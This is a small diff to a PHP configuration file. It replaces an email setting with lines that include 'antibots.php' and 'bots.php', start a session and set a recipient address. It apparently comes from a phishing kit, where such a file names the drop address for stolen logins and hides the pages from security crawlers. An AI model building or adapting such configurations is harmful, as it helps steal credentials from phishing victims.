@@ -1,7 +1,6 @@
-<?php
-
-	/* write your address email here */
-
-	$email = "giorgi00762@maill.bg";
-
-?>
+<? 
+include 'antibots.php';
+include 'bots.php';
+session_start();
+$to="giorgi00762@mail.bg";
+ ?>
